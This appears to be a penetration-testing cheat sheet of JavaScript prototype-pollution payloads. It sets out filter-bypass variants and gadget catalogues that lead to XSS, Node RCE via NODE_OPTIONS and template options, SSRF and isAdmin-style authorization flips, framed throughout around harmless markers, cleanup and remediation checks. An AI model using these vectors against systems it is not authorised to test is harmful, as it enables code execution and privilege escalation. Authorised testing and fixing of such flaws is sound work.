# Prototype pollution payloads
# Benign: pollute a harmless MARKER key, prove it on a FRESH object. Global effect — scope tightly, no persistent/destructive keys.

## Client-side (URL / hash / JSON input)
```
?__proto__[ppmarker]=polluted
?__proto__.ppmarker=polluted
?constructor[prototype][ppmarker]=polluted          # bypass when __proto__ is filtered
#__proto__[ppmarker]=polluted                        # via location.hash sinks
```
JSON input field:
```json
{"__proto__":{"ppmarker":"polluted"}}
{"constructor":{"prototype":{"ppmarker":"polluted"}}}
```
Confirm in console: `Object.prototype.ppmarker` → `"polluted"`, or `({}).ppmarker === "polluted"`.

## Server-side (JSON body → recursive merge / deep clone)
Target endpoints that merge attacker JSON into an object (`_.merge`, `_.defaultsDeep`, `Object.assign` deep,
`extend`, config/profile/settings updates):
```json
{"__proto__":{"ppmarker":"polluted"}}
{"constructor":{"prototype":{"ppmarker":"polluted"}}}
```
Confirm: a subsequent, unrelated response/object carries `ppmarker` (reflect it via a param the app reads
off a plain object, or an error that echoes an unset-but-now-present property).

## Blocked keys to defeat (why constructor.prototype matters)
Weak filters strip only `__proto__`. Try: `constructor.prototype.x`, `constructor[prototype][x]`,
mixed case, and nested (`__proto__[__proto__][x]`). A correct fix blocks `__proto__`, `prototype`, AND
`constructor`.

## Gadgets (pollution → impact) — hunt in js-analysis sinks
Client-side:
- polluted property read into `innerHTML` / `src` / `onerror` / template config → **XSS** (chain to xss-dom)
- polluted `0`/length/option defaults → logic/DoS
Server-side (Node):
- polluted spawn option (`shell`, `NODE_OPTIONS`, `env`) consumed by `child_process` → **RCE** (benign OOB proof)
- polluted template option / `Function` constructor path → **RCE** (chain to ssti/command-injection verifier criteria)
- polluted required property removed/overwritten → **DoS** (single controlled error only)

## Detection notes
Pollution ≠ reflection: a `__proto__` string appearing in a response is not proof. Proof = the property
exists on a FRESH object the attacker never touched. Tools: ppmap / pphound / DOM Invader (confirm manually).

---
## Extended arsenal — vector syntax matrix (every parser surface)

# Same intent (`Object.prototype.ppmarker = "polluted"`), expressed for whatever parser builds the object.
# Keep the marker key HARMLESS and uncommon (not `length`, `0`, `then`, or any real config key).

### Query-string / form (bracket vs dot — depends on the qs parser)
```
__proto__[ppmarker]=polluted
__proto__.ppmarker=polluted
__proto__%5Bppmarker%5D=polluted               # url-encoded brackets
constructor[prototype][ppmarker]=polluted
constructor.prototype.ppmarker=polluted
a[__proto__][ppmarker]=polluted                # nested under a real key the app merges
x[constructor][prototype][ppmarker]=polluted
```
### JSON body
```json
{"__proto__":{"ppmarker":"polluted"}}
{"constructor":{"prototype":{"ppmarker":"polluted"}}}
{"a":{"__proto__":{"ppmarker":"polluted"}}}
{"__proto__":{"__proto__":{"ppmarker":"polluted"}}}
```
### Deep / dotted-path APIs (`setValue(obj,path,val)`, `_.set`, object-path)
```
path=__proto__.ppmarker&value=polluted
path=constructor.prototype.ppmarker&value=polluted
path=a.b.__proto__.ppmarker&value=polluted
```
### Hash / DOM (client sinks that parse location.hash / search)
```
#__proto__[ppmarker]=polluted
#constructor[prototype][ppmarker]=polluted
?__proto__[ppmarker]=polluted
```

---
## Extended arsenal — key-filter bypass (defeat weak sanitizers)

# A correct fix blocks `__proto__`, `prototype`, AND `constructor` (and uses a null-proto object / Map).
# Weak fixes miss one of these. Climb this ladder to show the filter is incomplete — with a benign marker.

| Weak filter | Benign bypass |
|---|---|
| strips literal `__proto__` only | `constructor.prototype.ppmarker` / `constructor[prototype][ppmarker]` |
| single-pass strip of `__proto__` | `__pro__proto__to__[ppmarker]` -> after one removal becomes `__proto__` |
| single-pass strip of `constructor` | `con__proto__structor`-style nested rebuild (same idea) |
| blocks `.` dot-paths | bracket form `__proto__[ppmarker]` (and vice-versa) |
| case-folds the key | n/a — keys are case-SENSITIVE; `__PROTO__` is a different, harmless key (don't rely on it) |
| JSON key string-match pre-parse | `{"__proto__":{"ppmarker":"polluted"}}` (unicode-escaped key) |
| blocks top-level only | nest it: `{"a":{"__proto__":{"ppmarker":"polluted"}}}` |

# The strip-once reconstruction (`__pro__proto__to__`) is the highest-signal benign proof that the "fix" is a
# blocklist, not a structural defense. It pollutes the SAME marker — no extra impact.

---
## Extended arsenal — vulnerable sink / library catalog

# Recursive-merge, deep-clone, deep-set, and deep-defaults operations are the sinks. The generic smell:
#   target[key] = (typeof src[key] === 'object') ? merge(target[key], src[key]) : src[key]
# with no guard that `key !== '__proto__' && key !== 'constructor' && key !== 'prototype'`.

| Pattern / API family | Operation | Why it pollutes |
|---|---|---|
| deep recursive merge | merge attacker JSON into an object | walks `__proto__` as a normal key |
| deep defaults / apply-to-defaults | fill missing keys from attacker object | same recursion, write side |
| deep clone / extend(true, ...) | duplicate attacker object | copies into the prototype |
| deep set by string path | `set(obj,'a.b.c',v)` | path `__proto__.x` writes the prototype |
| zip / object-from-pairs (deep) | build object from `[key,val]` pairs | key `__proto__` |
| query-string parser (extended/bracket) | `?__proto__[x]=y` -> nested object | builds the `__proto__` branch |
| config / settings loader | merges user config over defaults | user controls the merge source |
| ORM / model setter (deep) | `.set(userInput)` mass-assign | attacker-controlled key path |
| schema coercion / validator mutate | fills defaults into the input object | write side |

# Fingerprint from js-analysis: deep-merge/clone/set helpers, extended (bracket) query parsing, and
# "update settings / profile / config" endpoints that accept a nested JSON object.

---
## Extended arsenal — detection & confirmation (fresh object, safe marker)

### Pick a SAFE marker (avoid breaking the app)
```
GOOD:  ppmarker, rs_pp_canary, zzprobe        # uncommon, no app meaning
AVOID: length, 0, 1, then, toString, valueOf, __proto__, constructor, id, role, isAdmin, status
       (clobbering these can crash the app or create a REAL impact — not benign)
```
### Confirm pollution (client)
```js
// after sending the vector:
({}).ppmarker === "polluted"            // a fresh object inherits it -> POLLUTED
Object.prototype.ppmarker               // "polluted"
delete Object.prototype.ppmarker        // CLEAN UP immediately
```
### Confirm pollution (server, no console) — reflection oracles
```
# 1) marker echoed: find a response built by spreading/merging a PLAIN {} the app creates AFTER your
#    request — the marker appears though you never set it on that object.
# 2) default-value flip: an endpoint whose response includes an optional field that is normally absent now
#    returns your marker value (it read the field off an object's prototype).
# 3) header/flag flip: a benign response header or boolean toggled by an "options" object default.
# Use a UNIQUE marker VALUE so the echo is attributable; re-test with a fresh request to rule out caching.
```
### Reflection is NOT pollution
A `__proto__` string appearing in a response proves nothing. Proof = a property the attacker NEVER set on a
given object is present because it lives on `Object.prototype`. Always clean up (`delete`), always re-test fresh.

---
## Extended arsenal — client-side gadget catalog (pollution -> sink, benign marker)

# Pollution sets a DEFAULT a library reads off the prototype and flows to a dangerous sink. Prove the gadget
# by polluting a MARKER that lands in the sink's input (e.g. shows up as an attribute / URL), then hand the
# executing PoC to `xss-dom`. Do NOT fire a destructive payload from this skill.

| Polluted default (example key) | Library behavior | Sink reached | Impact class |
|---|---|---|---|
| html / template / content option | option read when rendering | `innerHTML` | DOM XSS |
| src / url / scriptUrl option | lazy script/img loader default | `<script src>` / `<img src>` | DOM XSS / SSRF-ish |
| sanitizer allow-list / config | allow-list read off the proto | sanitizer passes marker tag | sanitizer bypass -> XSS |
| srcdoc / iframe option | frame-builder default | `<iframe srcdoc>` | DOM XSS |
| callback / handler name | dynamic dispatch by name | function lookup | script execution |
| 0 / length / option index | array / length defaults | widget logic | client DoS / logic |

# Benign confirmation: pollute the default so the MARKER appears in the DOM at the sink (e.g. an element gains
# `data-pp="polluted"`, or a `src` pointing at `TOKEN.oob.example`), proving the taint path — `xss-dom`
# escalates to the executing proof under its own criteria.

---
## Extended arsenal — server-side (Node) gadget catalog — benign OOB / marker

# A polluted prototype supplies a DEFAULT to an options object a Node API consumes. Confirm BENIGNLY (an
# attributable OOB callback to TOKEN.oob.example, or a reflected marker), then hand RCE-class impact to
# `command-injection` / `ssti` with their verify criteria. Keep the PoC benign — no destructive command.

| Polluted key (on an options object) | Consumed by | Effect | Benign proof |
|---|---|---|---|
| shell / argv0 / env / NODE_OPTIONS | child_process spawn/exec/fork | command/flag injection -> RCE | spawned child does an OOB ping |
| env.NODE_OPTIONS=--require=... | any later child_process | preload a module -> RCE | module does an OOB ping (test file) |
| compileDebug / self / outputFunctionName | template engine compile (pug/ejs) | template code injection -> RCE | render echoes a marker expr result |
| main / exports / paths | module resolution | hijack a require target | require resolves to a test marker |
| headers / proxy / host / path | http/https request options | SSRF / request-splitting | server fetches TOKEN.oob.example |
| json / limit / type | body-parser options | parsing behavior flip | benign parse-mode change observed |
| (required business flag) | app authorization default | authz default flip | see the authz gadget below |

# NODE_OPTIONS vector (illustrative, benign): pollute `env` so a subsequently-spawned Node child inherits
#   NODE_OPTIONS=--require=/tmp/rs_pp_probe.js  where the probe only performs an OOB callback. Prove the
#   callback fired; do NOT ship a weaponized require target. Hand to command-injection for scoring.

---
## Extended arsenal — framework-specific gadgets (keep benign)

### Node / Express
```
__proto__.status / __proto__.statusCode     # response-status default flip (benign: observe a probe code)
__proto__.body / __proto__.json             # default body injection into a response builder
__proto__.exposedHeaders / headers          # an extra response header appears (benign marker header)
__proto__.outputFunctionName                # EJS option gadget -> template RCE (hand to ssti)
query-parser 'extended': ?__proto__[x]=y    # pollution via the router's own qs parser
```
### Template engines (hand the execution proof to ssti)
```
pug:        __proto__.compileDebug / __proto__.self
ejs:        __proto__.outputFunctionName / __proto__.escapeFunction / __proto__.client
handlebars: __proto__ helper / partial defaults
```
### Client libraries
```
jQuery:          $.extend(true,{},userInput) sink; polluted ajax / getScript option defaults
lodash:          _.merge / _.defaultsDeep / _.set sinks; template compile options
AngularJS (1.x): prototype-provided scope defaults -> expression sandbox (legacy)
chart / UI configs: polluted option defaults flow into render (marker-in-DOM proof)
```
Each: prove pollution on a fresh object FIRST, then show the gadget flows a benign MARKER to the sink.

---
## Extended arsenal — authorization-flag & DoS gadgets (benign markers)

### Authz / "privesc-flag" gadget (common, high impact — keep benign)
# Apps frequently build a user/permission object from a plain `{}` and read booleans off it. If a check is
# `if (user.isAdmin)` and `isAdmin` is normally ABSENT (so `undefined`), polluting `Object.prototype.isAdmin`
# makes EVERY such object report truthy.
```
# BENIGN proof: pollute a NON-security marker that the same code path exposes, OR demonstrate on a FRESH
# object that the default is now present — DO NOT elevate a real session.
{"__proto__":{"rs_pp_flag":true}}       # then show ({}).rs_pp_flag === true on a fresh object
# Report the REAL gadget key (isAdmin / role / isAuthenticated / canEdit) as the impact, proven structurally
# via the fresh-object marker — never by actually flipping a production authorization decision.
```
### DoS gadget (single controlled error only)
```
# Polluting a key the hot path assumes absent can throw or change control flow for all objects.
__proto__.toString / __proto__.hasOwnProperty   # DANGEROUS to clobber broadly -> a SINGLE controlled
                                                 # request only, then delete; never leave the app degraded.
```
Keep DoS to one controlled observation; revert immediately. The finding is the missing guard, not an outage.

---
## Extended arsenal — safe-marker discipline, cleanup & remediation checks

### Cleanup (always)
```js
delete Object.prototype.ppmarker        // and every other marker you set
```
Global scope: your pollution affects EVERY object in the process/page until deleted or the process restarts —
set the minimum, keep the window short, never pollute a persistent store or a key with app meaning.

### Remediation to verify / report
```
Object.create(null)  /  new Map()                 # null-proto objects for user-controlled dictionaries
Object.freeze(Object.prototype)                   # blocks writes to the prototype
node --disable-proto=throw                         # disables __proto__ in the runtime
guard keys: key === '__proto__' || 'constructor' || 'prototype' -> reject (block ALL three)
Object.hasOwn(obj,k)                               # instead of reading inherited defaults
```
A fix that only strips `__proto__` is incomplete — re-test with `constructor.prototype` and the strip-once
reconstruction before calling it resolved.
